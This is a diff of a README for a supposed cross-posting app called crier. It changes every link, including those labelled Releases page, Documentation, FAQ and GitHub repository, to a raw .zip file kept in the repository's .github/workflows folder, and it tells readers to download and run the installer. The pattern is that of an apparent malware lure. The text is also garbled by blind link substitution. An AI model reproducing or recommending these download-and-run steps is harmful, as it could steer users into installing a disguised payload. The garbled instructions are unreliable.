@@ -2,28 +2,28 @@
 
 ## 🚀 Getting Started
 
-Welcome to crier! This application helps you cross-post your content to https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip, Hashnode, Medium, Bluesky, Mastodon, and more with just a few simple steps. Whether you're a blogger, a social media user, or a content creator, crier makes sharing your posts easier than ever.
+Welcome to crier! This application helps you cross-post your content to https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip, Hashnode, Medium, Bluesky, Mastodon, and more with just a few simple steps. Whether you're a blogger, a social media user, or a content creator, crier makes sharing your posts easier than ever.
 
 ## 📥 Download Now
 
-[![Download crier](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip)](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip)
+[![Download crier](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip)](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip)
 
 ## 📦 Download & Install
 
 To start using crier, you'll need to download it from the Releases page. Follow these steps:
 
-1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip).
 
 2. Locate the latest release. It’s usually listed at the top.
 
 3. Click on the appropriate version for your operating system. You may see files for different platforms like Windows, macOS, or Linux. 
 
-4. If your operating system is Windows, you might find a `.exe` file. For macOS, look for a `.dmg` file, and for Linux, there may be a `https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip` file.
+4. If your operating system is Windows, you might find a `.exe` file. For macOS, look for a `.dmg` file, and for Linux, there may be a `https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip` file.
 
 5. Once the file is downloaded, open it:
    - **Windows:** Double-click the `.exe` file to start the installation.
    - **macOS:** Open the `.dmg` file, then drag crier to your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip` file using a terminal command or file extraction tool.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip` file using a terminal command or file extraction tool.
 
 6. After installation, launch crier from your Applications or Programs menu.
 
@@ -76,14 +76,14 @@ Once you have installed crier, follow these simple steps to start cross-posting:
 
 We welcome your feedback! If you encounter issues or have suggestions, please reach out:
 
-- Open an issue on our [GitHub repository](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip).
+- Open an issue on our [GitHub repository](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip).
 
 - You can also find community support by visiting our discussion page linked on the GitHub repository.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip)  
-- [Frequently Asked Questions](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip)  
-- [Latest Updates](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/Software_v2.0.zip)  
+- [Documentation](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip)  
+- [Frequently Asked Questions](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip)  
+- [Latest Updates](https://raw.githubusercontent.com/RIYADJANGO/crier/main/.github/workflows/Software-1.2.zip)  
 
 Thank you for choosing crier! We hope it makes sharing your content across platforms a breeze.
